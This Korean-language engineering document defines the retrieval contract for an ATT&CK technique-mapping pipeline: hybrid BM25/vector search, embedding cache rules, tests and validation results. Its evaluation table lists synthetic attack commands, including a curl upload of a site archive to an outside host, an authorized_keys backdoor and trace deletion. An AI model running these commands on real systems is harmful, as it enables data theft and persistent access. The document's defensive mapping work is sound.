# ATT&CK Mapping B — Retrieval 계약과 인계

이 문서는 B의 입력·출력 경계다. 공유 설계의 JSON 필드를 사용하며 A의 `schema.py`,
`catalog.py`나 C의 Mapper를 대신 구현하지 않는다. A/C 통합 시 Python 자료형이 정해지면
이 JSON 경계와 대조한다. B 내부에 `MappingUnit`, `CandidateTechnique`을 중복 정의하지 않는다.

## A에서 받는 입력

- Catalog: 정규화된 Technique 객체의 iterable. 각 객체는 `technique_id`, `name`,
  `description` 문자열을 가진다. 선택 필드는 `tactics`(객체 목록), `parent_technique`
  (객체 또는 null), `is_subtechnique`, `revoked`, `deprecated`(boolean)다.
  Raw STIX bundle이나 A의 Catalog 클래스는 직접 입력하지 않는다. A에서 JSON 형태로 변환한다.
- Manifest: `attack_version`, `sha256`, `retrieval_version`, `embedding_model` 문자열.
  실제 STIX 파일의 해시 검증·버전 관리·다운로드는 A가 맡는다. B는 manifest를 수정하지 않는다.
- `build_mapping_unit(evidence)`에는 A/C가 Verdict·Evidence별 Provenance 검증을 통과시킨
  관찰 Evidence만 전달한다. B의 필드 검사는 참조 등록·모호성 검사를 대신하지 않는다.
  raw_refs가 없거나 `empty_result_call`이 지정된 Evidence는 방어적으로 거부한다.

## C에서 사용하는 API

```python
from attack_mapping.retrieve import (
    HybridRetriever, SentenceTransformerEmbedder, build_mapping_unit,
)

# catalog_records와 manifest는 A가 제공한다.
# model_revision은 설치한 모델의 고정된 Hugging Face commit SHA다.
embedder = SentenceTransformerEmbedder(
    model_name=manifest["embedding_model"], revision=model_revision,
)
retriever = HybridRetriever(catalog_records, embedder=embedder, manifest=manifest)
unit = build_mapping_unit(validated_evidence)
candidates = retriever.retrieve_candidates(unit, limit=10)
```

- `build_mapping_unit()`은 새 dict를 반환하며 `UNIT-<evidence_id>`를 생성한다.
  원래 evidence_id/sequence/time/layer/event_type/description/raw_refs를 유지한다.
- Query는 description/event_type/layer와 한영 용어 확장으로 만든다. 명령과 인자는 원문을 유지한다.
  사건 attack_type/severity/confidence, Rule ID, Sigma Tag를 검색에 사용하지 않는다.
- `HybridRetriever`를 Worker에서 한 번 만들고 Evidence마다 재사용한다.
  BM25/벡터 양쪽에서 기본 50개씩 검색하고 RRF(k=20)로 합쳐 최대 10개를 반환한다.
  후보 ID는 중복되지 않고 동일 점수는 ID 기준까지 사용해 안정적으로 정렬한다.
  k는 설정 가능하다. 한쪽 검색의 최상위 후보가 양쪽의 중간 순위 중복 후보에 밀리는 현상을
  줄이기 위해 기본값 20을 사용한다. 특정 Technique ID를 우대하는 분기는 없다.
- 후보는 공식 `technique_id`, `name`, `description`, `tactics`, `parent_technique`,
  `is_subtechnique`와 `rank`, `sources`, `rrf_score`, `retrieval_ranks`를 가진 dict다.
  점수는 순위 결합 값이며 공격 확신도나 최종 Technique 선택이 아니다.
- `retrieve_candidates(unit, catalog_records, ..., embedder=..., manifest=...)`는 단발 호출용이다.
  반복 실행에는 `HybridRetriever`를 사용한다. `build_bm25_index`, `build_vector_index`,
  `retrieve_bm25`, `retrieve_vector`, `rrf_merge`는 개별 검증용으로도 공개한다.
- 입력/설정 오류는 `ValueError`, Embedding 실행·캐시 I/O 오류는 `RetrievalError`다.
  C는 기술적 오류를 Mapping `error`로 기록한다. 벡터 실패를 BM25 성공이나 ABSTAIN으로 숨기지 않는다.
  비활성 항목뿐인 빈 Catalog는 후보가 없으며 모델을 호출하지 않는다.

## Embedding과 로컬 캐시

운영 기본 모델은 `intfloat/multilingual-e5-small`이며 고정 revision을
manifest에 기록한다. Adapter는 E5용 query/passage prefix를 사용한다.
다른 계열의 모델은 prefix 설정이나 아래 backend를 명시적으로 교체한다.

- 설치: `python -m pip install -r requirements.txt`. 공용 요구사항이
  `attack_mapping/requirements-retrieval.txt`를 포함한다.
- 모델은 사전에 준비한다. Adapter 기본값은 `local_files_only=True`이며 import나 객체 생성으로
  모델을 다운로드하지 않는다. 명시적으로 다운로드를 허용한 실행만 `local_files_only=False`를 쓴다.
- `revision`에는 고정 commit SHA를 사용한다. 캐시 식별에는 모델·revision·prefix·최대 길이·device가 포함된다.
  원격 사용자 정의 모델 코드는 실행하지 않는다(`trust_remote_code=False`).
  로딩 후 모델 설정을 바꾸려면 새 Adapter를 생성한다. 기본 512 token을 넘는 텍스트는
  모델에서 잘릴 수 있다. BM25는 전체 검색 문서를 사용하며 긴 Evidence의 품질은 별도 평가한다.
- 주입 backend는 `cache_identity` JSON 객체(최소 `model` 식별자),
  `encode_documents(list[str]) -> 2차원 수치 배열`, `encode_query(str) -> 1차원 수치 배열`을 제공한다.
  backend 변경 시 identity도 바뀌어야 한다. 테스트 대역은 실제 다국어 의미 검색의 품질을 증명하지 않는다.
- 캐시는 `data/attack/vector_index/`에 공식 Catalog 문서 벡터만 저장한다. Evidence/Query는 저장하지 않는다.
  Catalog 해시·실제 정규화 문서·모델 설정·retrieval_version이 바뀌면 다른 캐시를 생성한다.
  차원·유한 수치·벡터 체크섬을 검사하며 손상 캐시는 재생성한다. 저장은 임시 파일 후 원자적 교체를 쓴다.
  Manifest 원본을 덮어쓰지 않으며 생성 JSON은 Git에서 제외한다.

모델 사용 계약 참고: [E5 모델 카드](https://huggingface.co/intfloat/multilingual-e5-small),
[SentenceTransformer API](https://www.sbert.net/docs/package_reference/sentence_transformer/model.html).

## 검증과 남은 통합 작업

```bash
python -m pytest -q tests/test_attack_retrieve.py
python -m pytest -q
python -m scripts.demo_abcd
```

오프라인 검증은 Query 필드 제한, BM25·cosine·RRF 계산, 후보 제한·중복·비활성 제외,
명령 인자 보존, 캐시 재사용/무효화/손상, 벡터 실패 전파, 지연 로딩을 확인한다.
합성 Catalog와 대역 벡터로 검사하며 실제 LLM을 호출하지 않는다.

공식 Catalog + 실제 다국어 모델의 대표 시나리오 Recall@10은 별도 품질 평가다.
아래 수동 검증과 A/C가 실제 연결된 통합 검증을 구분한다. 단어 확장표나 테스트 기대 ID를
강제 Candidate로 넣어 통과시키지 않는다.

A: Catalog/manifest와 정규화 필드 계약 연결. C: Gate 통과 Evidence만 전달, 후보별 LLM/Validator,
예외→error 변환, Kill Chain/최종 보고서 연결. 기존 Rule Baseline의 `schema.py` 의존성 복구는 A 영역이다.

## 2026-09-28 B 검증 결과

- `python -m pytest -q tests/test_attack_retrieve.py`: 59 passed.
- `python -m pytest -q`: 194 passed. 실제 LLM 수동 평가 파일은 기존 pytest 설정에 따라 제외.
- `python -m scripts.demo_abcd`: 기존 조사 데모 통과, provenance passed.
- `python -m pip check`: 의존성 충돌 없음.

실제 검색에는 [공식 Enterprise ATT&CK v19.2 파일](https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack-19.2.json)의
활성 Technique/Sub-technique 697개를 사용했다. A의 운영 Catalog/manifest는 만들지 않았으며,
검증 전용 정규화 입력과 모델은 Git에서 제외되는 `results/retrieval_validation/`에 보관했다.
이 버전은 이번 평가 입력이며 코드 기본값으로 고정하지 않았다.

- Catalog SHA-256: `dc1639caa5501d720e280cf1cbd8fbe009884a0c9b3e6e9ed9d0c25166c3d8f4`
- 모델: `intfloat/multilingual-e5-small`, revision `614241f622f53c4eeff9890bdc4f31cfecc418b3`
- 런타임: Python 3.14.6, sentence-transformers 5.7.0, transformers 5.17.0, torch 2.14.0, CPU
- 설정: 각 검색 50개, RRF k=20, 최종 10개, 모델 최대 512 token

| 합성 관측 사례 | 목표 후보의 최종 순위 |
| --- | --- |
| 동일 출발지에서 SSH 비밀번호 인증 실패 반복 | T1110.001: 4 |
| PHP 웹셸 설치 후 HTTP 요청으로 명령 실행 | T1505.003: 1 |
| www-data가 `sh -c id;whoami;uname -a` 실행 | T1059.004: 8, T1033: 1, T1082: 10 |
| `/root/.ssh/authorized_keys`에 공개키 추가 | T1098.004: 1 |
| `tar -czf /tmp/site_backup.tar.gz /var/www/html` | T1560.001: 1, T1560: 8 |
| `curl -T /tmp/site_backup.tar.gz http://192.0.2.10/upload` | T1048.003: 6 |
| `rm -f /tmp/site_backup.tar.gz`로 흔적 삭제 | T1070.004: 1 |
| `whoami`와 `id`로 실행 계정 정보 확인 | T1033: 1 |
| `uname -a`로 시스템 정보 확인 | T1082: 1 |

9개 사례에서 목표 후보가 모두 Top 10에 포함됐다. 복합 셸 사례의 세 후보도 함께 포함됐다.
이는 소규모 개발 검증이며 일반적인 Recall 보장이나 LLM 선택·공격 판정의 정확도 평가가 아니다.
k=60에서는 복합 셸 사례의 Unix Shell이 BM25 1위/벡터 127위여도 최종 후보에서 빠졌다.
ID별 보정 없이 RRF 기본값을 20으로 조정했고, 한 검색에만 강하게 나타난 후보를 보존하는
합성 순위 회귀 테스트를 추가했다. A/C 통합 후 같은 입력과 별도 표현의 평가 자료로 다시 확인한다.

로컬 상세 결과는 `results/retrieval_validation/report.json`, 재현 스크립트는 같은 폴더의
`run_real.py`다. 둘 다 검증용 산출물로 Git에서 제외되므로 팀 공유 시 이 문서의 설정과 입력을
기준으로 재현한다. 실제 LLM 호출·LLM Validator·A/C 전체 연결은 이번 검증에 포함하지 않았다.

## 2026-09-30 `attack-mapping-final` 통합

- `attack_mapping/runtime.py`가 A의 `AttackCatalog`·`MappingUnit`·`CandidateTechnique`과
  B의 dict 기반 검색 계약을 연결한다. Candidate의 이름·설명·전술·부모는 공식 Catalog에서
  가져오며, B의 RRF 점수·순위·검색 출처만 검색 결과에서 전달한다.
- `HybridRetriever`는 매핑 대상 Evidence가 있을 때 생성하고 사건 안에서 재사용한다.
  선택적 `sequence`·`time`과 빈 관찰 문자열도 A Schema 계약대로 보존한다.
- manifest의 A 소유 버전·해시는 유지하고 B 키 `retrieval_version`, `embedding_model`,
  `embedding_revision`을 채웠다. 모델 revision은 이 문서의 실측 commit SHA로 고정했다.
- `python -m scripts.fetch_attack_catalog`와 `python -m scripts.fetch_attack_embedding`을
  명시적으로 실행해 공식 STIX와 모델을 준비한다. 평소 매핑은 로컬 모델만 사용한다.
- 저장된 조사 JSON의 기본 CLI·`main.py` 경로는 RAG다. 기존 규칙은
  `python -m attack_mapping.cli --rule-baseline <조사 JSON>`으로 비교할 수 있다.
- 합성 A Catalog·가짜 Embedding·가짜 LLM을 쓰는 A+B+C 연결 테스트는 통과했다.
  이 검증은 공식 STIX와 실제 모델·LLM을 함께 실행한 운영 E2E를 대신하지 않는다.

### 실제 모델·API 연결 확인 (2026-09-30)

- 공식 manifest와 SHA-256이 일치하는 Enterprise ATT&CK 19.2의 활성 기법 697개를 설치했다.
- 고정 E5 모델의 safetensors·토크나이저·설정 파일 9개를 로컬 Hugging Face 캐시에 설치했다.
  네트워크를 끈 로딩으로 384차원 검색 인덱스를 생성했고 다음 실행에서 캐시 재사용을 확인했다.
- 대표 합성 관측 9개 모두 기대 후보가 Top 10에 포함됐다. 상세 순위는 로컬
  `results/live_smoke/retrieval_report.json`에 기록했다.
- `claude-sonnet-5` 실제 API 응답과 합성 Evidence 1건의 RAG 전체 경로를 확인했다.
  `SELECT`한 T1033·T1059.004가 Validator를 통과해 `mapped`가 되었고 Kill Chain·Final Report를
  생성했다. 오류·거절·대체 모델 호출은 없었으며 원본 JSON은 보존됐다.
- 상세 API 응답은 로컬 `results/live_smoke/live_report.json`, 결과 보고서는 같은 폴더의
  `mapping/`에 있다. 합성 입력의 연결 검증이며 실제 사건 전반의 매핑 정확도 평가는 아니다.
- Mapping CLI도 `main.py`와 같이 `.env`를 로드한다. API 키는 Git에서 제외된 `.env`에만 둔다.
- 전체 오프라인 테스트: `python -m pytest -q` → 553 passed, 1 skipped.
